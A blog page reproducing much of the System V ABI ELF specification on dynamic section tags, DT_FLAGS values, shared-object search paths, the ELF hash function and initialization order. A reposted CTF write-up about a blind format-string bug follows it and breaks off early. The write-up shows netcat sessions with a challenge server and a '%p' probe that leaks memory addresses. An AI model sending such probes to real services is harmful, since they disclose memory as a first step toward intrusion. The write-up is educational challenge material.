<p>This element holds the size, in bytes, of a symbol table entry.</p>
</li>
<li><p><code>DT_INIT</code></p>
<p>This element holds the address of the initialization function, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_FINI</code></p>
<p>This element holds the address of the termination function, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below. </p>
</li>
<li><p><code>DT_SONAME</code></p>
<p>This element holds the string table offset of a null-terminated string, giving the name of the shared object. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry. See <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">“Shared Object Dependencies&#39;&#39;</a> below for more information about these names. </p>
</li>
<li><p><code>DT_RPATH</code></p>
<p>This element holds the string table offset of a null-terminated search library search path string discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">”Shared Object Dependencies&#39;&#39;</a>. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry. This entry is at level 2. Its use has been superseded by <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#dt_runpath" target="_blank" rel="external"><code>DT_RUNPATH</code></a>. </p>
</li>
<li><p><code>DT_SYMBOLIC</code></p>
<p>This element&#39;s presence in a shared object library alters the dynamic linker&#39;s symbol resolution algorithm for references within the library. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual. This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_symbolic" target="_blank" rel="external"><code>DF_SYMBOLIC</code></a> flag.</p>
</li>
<li><p><code>DT_REL</code></p>
<p>This element is similar to <code>DT_RELA</code>, except its table has implicit addends, such as <code>Elf32_Rel</code> for the 32-bit file class or <code>Elf64_Rel</code> for the 64-bit file class. If this element is present, the dynamic structure must also have<code>DT_RELSZ</code> and <code>DT_RELENT</code> elements.</p>
</li>
<li><p><code>DT_RELSZ</code></p>
<p>This element holds the total size, in bytes, of the <code>DT_REL</code> relocation table.</p>
</li>
<li><p><code>DT_RELENT</code></p>
<p>This element holds the size, in bytes, of the <code>DT_REL</code> relocation entry.</p>
</li>
<li><p><code>DT_PLTREL</code></p>
<p>This member specifies the type of relocation entry to which the procedure linkage table refers. The <code>d_val</code>member holds <code>DT_REL</code> or <code>DT_RELA</code>, as appropriate. All relocations in a procedure linkage table must use the same relocation.</p>
</li>
<li><p><code>DT_DEBUG</code></p>
<p>This member is used for debugging. Its contents are not specified for the ABI; programs that access this entry are not ABI-conforming.</p>
</li>
<li><p><code>DT_TEXTREL</code></p>
<p>This member&#39;s absence signifies that no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this member is present, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly. This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_textrel" target="_blank" rel="external"><code>DF_TEXTREL</code></a> flag.</p>
</li>
<li><p><code>DT_JMPREL</code></p>
<p>If present, this entry&#39;s <code>d_ptr</code> member holds the address of relocation entries associated solely with the procedure linkage table. Separating these relocation entries lets the dynamic linker ignore them during process initialization, if lazy binding is enabled. If this entry is present, the related entries of types<code>DT_PLTRELSZ</code> and <code>DT_PLTREL</code> must also be present.</p>
</li>
<li><p><code>DT_BIND_NOW</code></p>
<p>If present in a shared object or executable, this entry instructs the dynamic linker to process all relocations for the object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via <code>dlopen</code>(BA_LIB). This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_bind_now" target="_blank" rel="external"><code>DF_BIND_NOW</code></a> flag.</p>
</li>
<li><p><code>DT_INIT_ARRAY</code></p>
<p>This element holds the address of the array of pointers to initialization functions, discussed in<a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external"><code></code>Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_FINI_ARRAY</code></p>
<p>This element holds the address of the array of pointers to termination functions, discussed in<a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external"><code></code>Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_INIT_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of initialization functions pointed to by the <code>DT_INIT_ARRAY</code>entry. If an object has a <code>DT_INIT_ARRAY</code> entry, it must also have a <code>DT_INIT_ARRAYSZ</code> entry.</p>
</li>
<li><p><code>DT_FINI_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of termination functions pointed to by the <code>DT_FINI_ARRAY</code>entry. If an object has a <code>DT_FINI_ARRAY</code> entry, it must also have a <code>DT_FINI_ARRAYSZ</code> entry.</p>
</li>
<li><p><code>DT_RUNPATH</code></p>
<p>This element holds the string table offset of a null-terminated library search path string discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">”Shared Object Dependencies&#39;&#39;</a>. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry.</p>
</li>
<li><p><code>DT_FLAGS</code></p>
<p>This element holds flag values specific to the object being loaded. Each flag value will have the name <code>DF_</code><em>flag_name</em>. Defined values and their meanings are described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_flags" target="_blank" rel="external">below</a>. All other values are reserved.</p>
</li>
<li><p><code>DT_PREINIT_ARRAY</code></p>
<p>This element holds the address of the array of pointers to pre-initialization functions, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below. The <code>DT_PREINIT_ARRAY</code> table is processed only in an executable file; it is ignored if contained in a shared object. </p>
</li>
<li><p><code>DT_PREINIT_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of pre-initialization functions pointed to by the <code>DT_PREINIT_ARRAY</code> entry. If an object has a <code>DT_PREINIT_ARRAY</code> entry, it must also have a <code>DT_PREINIT_ARRAYSZ</code> entry. As with <code>DT_PREINIT_ARRAY</code>, this entry is ignored if it appears in a shared object.</p>
</li>
<li><p><code>DT_SYMTAB_SHNDX</code></p>
<p>This element holds the address of the <code>SHT_SYMTAB_SHNDX</code> section associated with the dynamic symbol table referenced by the <code>DT_SYMTAB</code> element.</p>
</li>
<li><p><code>DT_ENCODING</code></p>
<p>Values greater than or equal to <code>DT_ENCODING</code> and less than <code>DT_LOOS</code> follow the rules for the interpretation of the <code>d_un</code> union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
<li><p><code>DT_LOOS</code> through <code>DT_HIOS</code></p>
<p>Values in this inclusive range are reserved for operating system-specific semantics. All such values follow the rules for the interpretation of the <code>d_un</code> union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
<li><p><code>DT_LOPROC</code> through <code>DT_HIPROC</code></p>
<p>Values in this inclusive range are reserved for processor-specific semantics. If meanings are specified, the processor supplement explains them. All such values follow the rules for the interpretation of the <code>d_un</code>union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
</ul>
<p>Except for the <code>DT_NULL</code> element at the end of the array, and the relative order of <code>DT_NEEDED</code> elements, entries may appear in any order. Tag values not appearing in the table are reserved.</p>
<hr>
<p>Figure 5-11: <code>DT_FLAGS</code> values</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DF_ORIGIN</code></td>
<td><code>0x1</code></td>
</tr>
<tr>
<td><code>DF_SYMBOLIC</code></td>
<td><code>0x2</code></td>
</tr>
<tr>
<td><code>DF_TEXTREL</code></td>
<td><code>0x4</code></td>
</tr>
<tr>
<td><code>DF_BIND_NOW</code></td>
<td><code>0x8</code></td>
</tr>
<tr>
<td><code>DF_STATIC_TLS</code></td>
<td><code>0x10</code></td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li><p><code>DF_ORIGIN</code></p>
<p>This flag signifies that the object being loaded may make reference to the <code>$ORIGIN</code> substitution string (see <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#substitution" target="_blank" rel="external">&quot;Substitution Sequences&#39;&#39;</a>). The dynamic linker must determine the pathname of the object containing this entry when the object is loaded. </p>
</li>
<li><p><code>DF_SYMBOLIC</code></p>
<p>If this flag is set in a shared object library, the dynamic linker&#39;s symbol resolution algorithm for references within the library is changed. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual.</p>
</li>
<li><p><code>DF_TEXTREL</code></p>
<p>If this flag is not set, no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this flag is set, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly.</p>
</li>
<li><p><code>DF_BIND_NOW</code></p>
<p>If set in a shared object or executable, this flag instructs the dynamic linker to process all relocations for the object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via <code>dlopen</code>(BA_LIB).</p>
</li>
<li><p><code>DF_STATIC_TLS</code></p>
<p>If set in a shared object or executable, this flag instructs the dynamic linker to reject attempts to load this file dynamically. It indicates that the shared object or executable contains code using a <em>static thread-local storage</em> scheme. Implementations need not support any form of thread-local storage.</p>
</li>
</ul>
<h3 id="Shared-Object-Dependencies"><a href="#Shared-Object-Dependencies" class="headerlink" title="Shared Object Dependencies"></a>Shared Object Dependencies</h3><p>When the link editor processes an archive library, it extracts library members and copies them into the output object file. These statically linked services are available during execution without involving the dynamic linker. Shared objects also provide services, and the dynamic linker must attach the proper shared object files to the process image for execution.</p>
<p>When the dynamic linker creates the memory segments for an object file, the dependencies (recorded in<code>DT_NEEDED</code> entries of the dynamic structure) tell what shared objects are needed to supply the program&#39;s services. By repeatedly connecting referenced shared objects and their dependencies, the dynamic linker builds a complete process image. When resolving symbolic references, the dynamic linker examines the symbol tables with a breadth-first search. That is, it first looks at the symbol table of the executable program itself, then at the symbol tables of the <code>DT_NEEDED</code> entries (in order), and then at the second level <code>DT_NEEDED</code> entries, and so on. Shared object files must be readable by the process; other permissions are not required.</p>
<hr>
<p> Even when a shared object is referenced multiple times in the dependency list, the dynamic linker will connect the object only once to the process.</p>
<hr>
<p>Names in the dependency list are copies either of the <code>DT_SONAME</code> strings or the path names of the shared objects used to build the object file. For example, if the link editor builds an executable file using one shared object with a <code>DT_SONAME</code> entry of <code>lib1</code> and another shared object library with the path name <code>/usr/lib/lib2</code>, the executable file will contain <code>lib1</code> and <code>/usr/lib/lib2</code> in its dependency list.</p>
<p>If a shared object name has one or more slash (<code>/</code>) characters anywhere in the name, such as <code>/usr/lib/lib2</code> or <code>directory/file</code>, the dynamic linker uses that string directly as the path name. If the name has no slashes, such as <code>lib1</code>, three facilities specify shared object path searching.</p>
<hr>
<ul>
<li><ul>
<li><p>The dynamic array tag DT_RUNPATH gives a string that holds a list of directories, separated by colons (:). For example, the string <code>/home/dir/lib:/home/dir2/lib:</code> tells the dynamic linker to search first the directory <code>/home/dir/lib</code> , then <code>/home/dir2/lib</code>, and then the current directory to find dependencies.</p>
<p>The set of directories specified by a given <code>DT_RUNPATH</code> entry is used to find only the immediate dependencies of the executable or shared object containing the <code>DT_RUNPATH</code> entry. That is, it is used only for those dependencies contained in the <code>DT_NEEDED</code> entries of the dynamic structure containing the <code>DT_RUNPATH</code> entry, itself. One object&#39;s <code>DT_RUNPATH</code> entry does not affect the search for any other object&#39;s dependencies.</p>
</li>
<li><p>A variable called  <code>LD_LIBRARY_PATH</code>in the process environment [see exec(BA_OS)] may hold a list of directories as above, optionally followed by a semicolon (;) and another directory list. The following values would be equivalent to the previous example:</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib:</div></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib;/home/dir2/usr/lib:</div></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib:;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>Although some programs (such as the link editor) treat the lists before and after the semicolon differently, the dynamic linker does not. Nevertheless, the dynamic linker accepts the semicolon notation, with the semantics described previously.</p>
<p>All <code>LD_LIBRARY_PATH</code> directories are searched before those from <code>DT_RUNPATH</code>.</p>
</li>
<li><p>Finally, if the other two groups of directories fail to locate the desired library, the dynamic linker searches the default directories, <code>/usr/lib</code> or such other directories as may be specified by the ABI supplement for a given processor.</p>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>When the dynamic linker is searching for shared objects, it is not a fatal error if an ELF file with the wrong attributes is encountered in the search. Instead, the dynamic linker shall exhaust the search of all paths before determining that a matching object could not be found. For this determination, the relevant attributes are contained in the following ELF header fields: <code>e_ident[EI_DATA]</code>, <code>e_ident[EI_CLASS]</code>,<code>e_ident[EI_OSABI]</code>, <code>e_ident[EI_ABIVERSION]</code>, <code>e_machine</code>, <code>e_type</code>, <code>e_flags</code> and <code>e_version</code>.</li>
</ul>
<hr>
<ul>
<li>For security, the dynamic linker ignores <code>LD_LIBRARY_PATH</code> for set-user and set-group ID programs. It does, however, search <code>DT_RUNPATH</code>  directories and the default directories. The same restriction may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms.</li>
</ul>
<hr>
<ul>
<li><p>A fourth search facility, the dynamic array tag  <code>DT_RPATH</code>, has been moved to level 2 in the ABI. It provides a colon-separated list of directories to search. Directories specified by <code>DT_RPATH</code> are searched before directories specified by <code>LD_LIBRARY_PATH</code></p>
</li>
<li><p>If both <code>DT_RPATH</code> and <code>DT_RUNPATH</code> entries appear in a single object&#39;s dynamic array, the dynamic linker processes only the <code>DT_RUNPATH</code> entry.</p>
</li>
</ul>
<hr>
<ul>
<li><h3 id="Substitution-Sequences"><a href="#Substitution-Sequences" class="headerlink" title="Substitution Sequences"></a>Substitution Sequences</h3></li>
<li><p>Within a string provided by dynamic array entries with the <code>DT_NEEDED</code> or <code>DT_RUNPATH</code> tags and in pathnames passed as parameters to the <code>dlopen()</code> routine, a dollar sign ($) introduces a substitution sequence. This sequence consists of the dollar sign immediately followed by either the longest name sequence or a name contained within left and right braces ({) and (}). A name is a sequence of bytes that start with either a letter or an underscore followed by zero or more letters, digits or underscores. If a dollar sign is not immediately followed by a name or a brace-enclosed name, the behavior of the dynamic linker is unspecified.</p>
</li>
<li><p>If the name is ”ORIGIN“, then the substitution sequence is replaced by the dynamic linker with the absolute pathname of the directory in which the object containing the substitution sequence originated. Moreover, the pathname will contain no symbolic links or use of  ”.&quot; or &quot;..&quot; components. Otherwise (when the name is not &quot;<code>ORIGIN</code>&#39;&#39;) the behavior of the dynamic linker is unspecified.</p>
</li>
<li><p>When the dynamic linker loads an object that uses <code>$ORIGIN</code>, it must calculate the pathname of the directory containing the object. Because this calculation can be computationally expensive, implementations may want to avoid the calculation for objects that do not use <code>$ORIGIN</code>. If an object calls <code>dlopen()</code> with a string containing <code>$ORIGIN</code> and does not use <code>$ORIGIN</code> in one if its dynamic array entries, the dynamic linker may not have calculated the pathname for the object until the <code>dlopen()</code> actually occurs. Since the application may have changed its current working directory before the <code>dlopen()</code> call, the calculation may not yield the correct result. To avoid this possibility, an object may signal its intention to reference <code>$ORIGIN</code> by setting the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_flags" target="_blank" rel="external"><code>DF_ORIGIN</code> flag</a>. An implementation may reject an attempt to use <code>$ORIGIN</code>within a <code>dlopen()</code> call from an object that did not set the <code>DF_ORIGIN</code> flag and did not use <code>$ORIGIN</code> within its dynamic array.</p>
</li>
</ul>
<hr>
<ul>
<li>For security, the dynamic linker does not allow use of <code>$ORIGIN</code> substitution sequences for set-user and set-group ID programs. For such sequences that appear within strings specified by   <code>DT_RUNPATH</code> dynamic array entries, the specific search path containing the <code>$ORIGIN</code> sequence is ignored (though other search paths in the same string are processed). <code>$ORIGIN</code> sequences within a  <code>DT_NEEDED</code> entry or path passed as a parameter to  <code>dlopen()</code> are treated as errors. The same restrictions may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms.</li>
</ul>
<hr>
<ul>
<li><h3 id="Global-Offset-Table"><a href="#Global-Offset-Table" class="headerlink" title="Global Offset Table"></a>Global Offset Table</h3></li>
</ul>
<hr>
<ul>
<li>This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details.</li>
</ul>
<hr>
<ul>
<li><h3 id="Procedure-Linkage-Table"><a href="#Procedure-Linkage-Table" class="headerlink" title="Procedure Linkage Table"></a>Procedure Linkage Table</h3></li>
</ul>
<hr>
<ul>
<li>This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details.</li>
</ul>
<hr>
<ul>
<li><h3 id="Hash-Table"><a href="#Hash-Table" class="headerlink" title="Hash Table"></a>Hash Table</h3></li>
<li><p>A hash table of    <code>Elf32_Word</code> objects supports symbol table access. The same table layout is used for both the 32-bit and 64-bit file class. Labels appear below to help explain the hash table organization, but they are not part of the specification.</p>
</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-12: Symbol Hash Table</p>
</li>
<li><p>| <code>nbucket</code>                         |<br>| --------------------------------- |<br>| <code>nchain</code>                          |<br>| <code>bucket[0]. . .bucket[nbucket-1]</code> |<br>| <code>chain[0]. . .chain[nchain-1]</code>    |</p>
</li>
</ul>
<hr>
<ul>
<li>The <code>bucket</code> array contains <code>nbucket</code> entries, and the <code>chain</code> array contains <code>nchain</code> entries; indexes start at 0. Both <code>bucket</code> and <code>chain</code> hold symbol table indexes. Chain table entries parallel the symbol table. The number of symbol table entries should equal <code>nchain</code>; so symbol table indexes also select chain table entries. A hashing function (shown below) accepts a symbol name and returns a value that may be used to compute a <code>bucket</code> index. Consequently, if the hashing function returns the value <em>x</em> for some name, <code>bucket[</code><em>x</em><code>%nbucket]</code> gives an index, <em>y</em>, into both the symbol table and the chain table. If the symbol table entry is not the one desired, <code>chain[</code><em>y</em><code>]</code> gives the next symbol table entry with the same hash value. One can follow the <code>chain</code> links until either the selected symbol table entry holds the desired name or the <code>chain</code>entry contains the value <code>STN_UNDEF</code>.</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-13: Hashing Function</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">unsigned long</div><div class="line">elf_hash(const unsigned char *name)</div><div class="line">&#123;</div><div class="line">	unsigned long	h = 0, g;</div><div class="line">	while (*name)</div><div class="line">	&#123;</div><div class="line">		h = (h &lt;&lt; 4) + *name++;</div><div class="line">		if (g = h &amp; 0xf0000000)</div><div class="line">			h ^= g &gt;&gt; 24;</div><div class="line">		h &amp;= ~g;</div><div class="line">	&#125;</div><div class="line">	return h;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li><h3 id="Initialization-and-Termination-Functions"><a href="#Initialization-and-Termination-Functions" class="headerlink" title="Initialization and Termination Functions"></a>Initialization and Termination Functions</h3></li>
<li><p>After the dynamic linker has built the process image and performed the relocations, each shared object and the executable file get the opportunity to execute some initialization functions. All shared object initializations happen before the executable file gains control.</p>
</li>
<li><p>Before the initialization functions for any object A is called, the initialization functions for any other objects that object A depends on are called. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the <code>DT_NEEDED</code> entries of the dynamic structure). The order of initialization for circular dependencies is undefined.</p>
</li>
<li><p>The initialization of objects occurs by recursing through the needed entries of each object. The initialization functions for an object are invoked after the needed entries for that object have been processed. The order of processing among the entries of a particular list of needed objects is unspecified.</p>
</li>
</ul>
<hr>
<ul>
<li>Each processor supplement may optionally further restrict the algorithm used to determine the order of initialization. Any such restriction, however, may not conflict with the rules described by this specification.</li>
</ul>
<hr>
<ul>
<li>The following example illustrates two of the possible correct orderings which can be generated for the example NEEDED lists. In this example the <em>a.out</em> is dependent on <code>b</code>, <code>d</code>, and <code>e</code>. <code>b</code> is dependent on <code>d</code> and <code>f</code>, while <code>d</code> is dependent on <code>e</code> and <code>g</code>. From this information a dependency graph can be drawn. The above algorithm on initialization will then allow the following specified initialization orderings among others.</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-14: Initialization Ordering Example</p>
</li>
<li><p>​</p>
</li>
<li><p><img src="/images/2018-04-21/init_example.gif" alt="img"></p>
</li>
<li><p>​</p>
</li>
</ul>
<hr>
<ul>
<li><p>Similarly, shared objects and executable files may have termination functions, which are executed with the <code>atexit</code>(BA_OS) mechanism after the base process begins its termination sequence. The termination functions for any object A must be called before the termination functions for any other objects that object A depends on. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the <code>DT_NEEDED</code> entries of the dynamic structure). The order of termination for circular dependencies is undefined.</p>
</li>
<li><p>Finally, an executable file may have pre-initialization functions. These functions are executed after the dynamic linker has built the process image and performed relocations but before any shared object initialization functions. Pre-initialization functions are not permitted in shared objects.</p>
</li>
</ul>
<hr>
<ul>
<li>Complete initialization of system libraries may not have occurred when pre-initializations are executed, so some features of the system may not be available to pre-initialization code. In general, use of pre-initialization code can be considered portable only if it has no dependencies on system libraries.</li>
</ul>
<hr>
<ul>
<li><p>The dynamic linker ensures that it will not execute any initialization, pre-initialization, or termination functions more than once.</p>
</li>
<li><p>Shared objects designate their initialization and termination code in one of two ways. First, they may specify the address of a function to execute via the <code>DT_INIT</code> and <code>DT_FINI</code> entries in the dynamic structure, described in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#dynamic_section" target="_blank" rel="external">&quot;Dynamic Section&#39;&#39;</a> above.</p>
</li>
</ul>
<hr>
<ul>
<li>Note that the address of a function need not be the same as a pointer to a function as defined by the processor supplement.</li>
</ul>
<hr>
<ul>
<li>Shared objects may also (or instead) specify the address and size of an array of function pointers. Each element of this array is a pointer to a function to be executed by the dynamic linker. Each array element is the size of a pointer in the programming model followed by the object containing the array. The address of the array of initialization function pointers is specified by the <code>DT_INIT_ARRAY</code> entry in the dynamic structure. Similarly, the address of the array of pre-initialization functions is specified by <code>DT_PREINIT_ARRAY</code>and the address of the array of termination functions is specified by <code>DT_FINI_ARRAY</code>. The size of each array is specified by the <code>DT_INIT_ARRAYSZ</code>, <code>DT_PREINIT_ARRAYSZ</code>, and <code>DT_FINI_ARRAYSZ</code> entries.</li>
</ul>
<hr>
<ul>
<li>The addresses contained in the initialization and termination arrays are function pointers as defined by the processor supplement for each processor. On some architectures, a function pointer may not contain the actual address of the function.</li>
</ul>
<hr>
<ul>
<li><p>The functions pointed to in the arrays specified by <code>DT_INIT_ARRAY</code> and by <code>DT_PREINIT_ARRAY</code> are executed by the dynamic linker in the same order in which their addresses appear in the array; those specified by <code>DT_FINI_ARRAY</code> are executed in reverse order.</p>
</li>
<li><p>If an object contains both <code>DT_INIT</code> and <code>DT_INIT_ARRAY</code> entries, the function referenced by the <code>DT_INIT</code> entry is processed before those referenced by the <code>DT_INIT_ARRAY</code> entry for that object. If an object contains both <code>DT_FINI</code> and <code>DT_FINI_ARRAY</code> entries, the functions referenced by the <code>DT_FINI_ARRAY</code> entry are processed before the one referenced by the <code>DT_FINI</code> entry for that object.</p>
</li>
</ul>
<hr>
<ul>
<li>Although the atexit(BA_OS) termination processing normally will be done, it is not guaranteed to have executed upon process death. In particular, the process will not execute the termination processing if it calls <code>_exit</code>[see exit(BA_OS)] or if the process dies because it received a signal that it neither caught nor ignored.</li>
</ul>
<hr>
<ul>
<li>The processor supplement for each processor specifies whether the dynamic linker is responsible for calling the executable file&#39;s initialization function or registering the executable file&#39;s termination function with <code>atexit</code>(BA_OS). Termination functions specified by users via the <code>atexit</code>(BA_OS) mechanism must be executed before any termination functions of shared objects.</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/" itemprop="url">blind attack:HITB-XCTF Quals 2018 - babypwn</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-20T22:17:22+08:00">
                2018-04-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>From <a href="https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/" target="_blank" rel="external">https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/</a></p>
<h2 id="Challenge-description"><a href="#Challenge-description" class="headerlink" title="Challenge description"></a>Challenge description</h2><p>nc 47.75.182.113 9999</p>
<h2 id="Challenge-resolution"><a href="#Challenge-resolution" class="headerlink" title="Challenge resolution"></a>Challenge resolution</h2><h3 id="Introducing-ourselves"><a href="#Introducing-ourselves" class="headerlink" title="Introducing ourselves"></a>Introducing ourselves</h3><p>Using netcat to connect to the challenge, we are greeted with the following message :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">&lt;NOTHING...&gt;</div></pre></td></tr></table></figure>
<p>Very talkative server, I appreciate that…<br>Maybe we should introduce ourselves :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">Hello, I&apos;m Florent             # My input</div><div class="line">Hello, I&apos;m Florent             # Server&apos;s reply</div></pre></td></tr></table></figure>
<p>So, it seems that the server is sending our input back to us (or is called Florent as well, which is likely not the case…).<br>At this point, one of the possible vulnerabilities that comes to our mind is a format string vulnerability :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">Hello, I&apos;m Florent</div><div class="line">Hello, I&apos;m Florent</div><div class="line">%p %p %p %p %p                                                     # My input</div><div class="line">(nil) (nil) 0x7f2a89d352f0 0x7f2a8a02f780 0x7f2a8a256700           # Server&apos;s reply</div></pre></td></tr></table></figure>
<p>By sending <code>%p</code> to the server, it replies to us with an address to which a pointer refers.<br>Unfortunately for us, we don’t have access to the binary or its source code.<br>But here we are : a blind format string vulnerability !</p>
<h3 id="Further-knowing-the-server-or-getting-our-hands-dirty"><a href="#Further-knowing-the-server-or-getting-our-hands-dirty" class="headerlink" title="Further knowing the server (or getting our hands dirty)"></a>Further knowing the server (or getting our hands dirty)</h3><p>Now it’s time to find a way to grab the flag.<br>I’ve already played with format strings vulnerabilities but never blindly.<br>While looking on the net for information on how I could efficiently leak usable addresses from the binary, I came across a challenge from the 33c3 CTF entitled <code>Eat, Sleep Pwn, Repeat</code> or <code>ESPR</code> (which is also the name of the German team which organized the 33c3 CTF).<br>The situation is pretty much the same and I started looking at write-ups of the challenge.<br>I stumbled across these 2 excellent ressources that I encourage you to take a look at :</p>
<ul>
<li><a href="https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/README.md" target="_blank" rel="external">Write-up from @jay_f0xtr0t:</a></li>
